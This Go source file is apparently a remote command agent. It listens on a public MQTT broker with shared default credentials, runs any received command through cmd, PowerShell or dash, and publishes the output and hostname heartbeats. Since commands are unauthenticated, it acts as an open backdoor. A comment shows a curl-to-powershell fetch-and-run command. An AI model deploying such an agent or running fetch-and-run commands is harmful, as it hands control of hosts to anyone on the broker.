package main

import (
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"time"

	mqtt "github.com/eclipse/paho.mqtt.golang"
)

type Message struct {
	OS      string
	Type    string
	Command string
}

var messagePubHandler mqtt.MessageHandler = func(client mqtt.Client, msg mqtt.Message) {
	// fmt.Printf("Received message: %s from topic: %s\n", msg.Payload(), msg.Topic())

	var message Message
	err := json.Unmarshal(msg.Payload(), &message)
	if err != nil {
		fmt.Println("error:", err)
		return
	}

	// COMMON:
	// Print Recv JSON
	// log.Printf("Name: %s\n", message.OS)
	// log.Printf("Type: %s\n", message.Type)
	// log.Printf("Command: %s\n", message.Command)

	//TODO:OS DETECT
	log.Println(runtime.GOOS)

	if runtime.GOOS == message.OS {
		if message.Type == "bat" {
			if runtime.GOOS != "linux" {
				log.Println("win bat cmd recv")
				publish_log(client, get_hostname()+"win bat cmd recv")

				go func() {
					cmd := exec.Command("cmd", "/C", message.Command)
					out, err := cmd.CombinedOutput()
					if err != nil {
						fmt.Println("error with:", err.Error())
						publish_log(client, err.Error())
					} else {
						fmt.Println(string(out))
						publish_log(client, string(out))
					}
				}()

			}
		} else if message.Type == "bat_script" {
			if runtime.GOOS != "linux" {
				log.Println("win batch cmd recv")
				publish_log(client, get_hostname()+"win bat cmd recv")
				go func() {
					cmd := exec.Command("cmd", "/C", message.Command)
					out, err := cmd.CombinedOutput()
					if err != nil {
						fmt.Println("error with:", err.Error())
						publish_log(client, err.Error())
					} else {
						fmt.Println(string(out))
						publish_log(client, string(out))
					}
				}()

			}

		} else if message.Type == "powershell" {
			log.Println("powershell cmd recv")
			go func() {
				cmd := exec.Command("powershell", "-Command", message.Command)
				out, err := cmd.CombinedOutput()
				if err != nil {
					fmt.Println("error with:", err.Error())
					publish_log(client, err.Error())
				} else {
					fmt.Println(string(out))
					publish_log(client, string(out))
				}
			}()

		} else if message.Type == "pwsh" {
			log.Println("win pwsh cmd recv")
			go func() {
				cmd := exec.Command("pwsh", "-Command", message.Command)
				out, err := cmd.CombinedOutput()
				if err != nil {
					fmt.Println("error with:", err.Error())
					publish_log(client, err.Error())
				} else {
					fmt.Println(string(out))
					publish_log(client, string(out))
				}
			}()

		} else if message.Type == "powershell_script" {
			log.Println("win powershell_script cmd recv")
			go func() {
				cmd := exec.Command("cmd", "/C", message.Command)
				out, err := cmd.CombinedOutput()
				if err != nil {
					fmt.Println("error with:", err.Error())
					publish_log(client, err.Error())
				} else {
					fmt.Println(string(out))
					publish_log(client, string(out))
				}

				// {
				// 	"type": "powershell_script",
				// 	"command":"curl -s https://it2u.oss-cn-shenzhen.aliyuncs.com/scripts/test.ps1 | powershell -NoLogo"
				// }
			}()

		} else if message.Type == "bash" {
			if runtime.GOOS != "windows" {
				log.Println("linux cmd")
				publish_log(client, get_hostname()+"linux bash cmd recv")

				go func() {
					cmd := exec.Command("dash", "-c", message.Command)
					out, err := cmd.CombinedOutput()
					if err != nil {
						fmt.Println("error with:", err.Error())
						publish_log(client, err.Error())
					} else {
						fmt.Println(string(out))
						publish_log(client, string(out))
					}
				}()

			}

		} else {
			log.Println("Bad command type")
			publish_log(client, get_hostname()+":Bad command type")
		}
	} else {
		log.Println("Mismatched OS Type")
		publish_log(client, get_hostname()+"Bad OS parameter")
	}
}

var connectHandler mqtt.OnConnectHandler = func(client mqtt.Client) {
	fmt.Println("Connected")
}

var connectLostHandler mqtt.ConnectionLostHandler = func(client mqtt.Client, err error) {
	fmt.Printf("Connect lost: %v", err)
}

func random_string() string {
	rand.Seed(time.Now().Unix())

	str := "abcdefghijklmnopqrstuvwxyz"

	shuff := []rune(str)

	// Shuffling the string
	rand.Shuffle(len(shuff), func(i, j int) {
		shuff[i], shuff[j] = shuff[j], shuff[i]
	})

	// Displaying the random string
	return string(shuff)
}

func main() {
	var broker = "broker.emqx.io"
	var port = 1883
	opts := mqtt.NewClientOptions()
	opts.AddBroker(fmt.Sprintf("tcp://%s:%d", broker, port))
	opts.SetClientID(random_string())
	opts.SetUsername("emqx")
	opts.SetPassword("public")
	opts.SetDefaultPublishHandler(messagePubHandler)
	opts.OnConnect = connectHandler
	opts.OnConnectionLost = connectLostHandler
	client := mqtt.NewClient(opts)
	if token := client.Connect(); token.Wait() && token.Error() != nil {
		panic(token.Error())
	}

	subscript_opera(client)
	for {
		now := time.Now()
		publish_live(client, fmt.Sprintf("Time:%s,Hostname:%s is alive", now.Format("2006-01-02 15:04:05"), get_hostname()))
		time.Sleep(15 * time.Second)
		subscript_opera(client)
	}

}

func publish_live(client mqtt.Client, msg string) {
	text := fmt.Sprintf("Message %s", msg)
	token := client.Publish("topic/live", 0, false, text)
	token.Wait()
	time.Sleep(time.Second)
}

func publish_log(client mqtt.Client, msg string) {
	text := fmt.Sprintf("Message: %s", msg)
	token := client.Publish("topic/log", 0, false, text)
	token.Wait()
	time.Sleep(time.Second)
}

func subscript_opera(client mqtt.Client) {
	topic := "topic/cmd"
	token := client.Subscribe(topic, 1, nil)
	token.Wait()
	fmt.Print(".")
}

func get_hostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		log.Fatal("get hostname err")
	}
	return hostname + "(" + runtime.GOOS + ")"
}
